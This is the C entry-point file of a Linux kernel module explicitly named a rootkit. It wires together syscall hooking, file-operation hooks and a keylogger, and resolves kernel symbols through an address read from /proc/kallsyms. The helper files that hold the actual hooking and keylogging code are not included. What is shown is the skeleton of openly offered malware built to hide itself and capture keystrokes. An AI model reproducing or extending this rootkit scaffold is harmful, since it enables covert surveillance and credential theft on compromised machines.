#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include "simple_rootkit.h"
#include "fops.h"
#include "keylogger.h"
#include "etc.h"
#include "hooking.h"

// module documentation
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

// module paramters
unsigned long lookup_addr = 0;
module_param(lookup_addr, ulong, S_IRUGO);
MODULE_PARM_DESC(lookup_addr, "The address of kallsyms_lookup_name function from /proc/kallsyms");

static int __init rootkit_init(void) {
	init_etc(lookup_addr);
	init_hooking();
	init_fops();
	init_keylogger();
	printk(KERN_INFO "[+] Module loaded, inside %s.\n", __FUNCTION__);
	return 0;
}

static void __exit rootkit_exit(void) {
	exit_hooking();
	exit_fops();
	exit_keylogger();
	printk(KERN_INFO "[-] Module unloaded, inside %s.\n", __FUNCTION__);
	return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
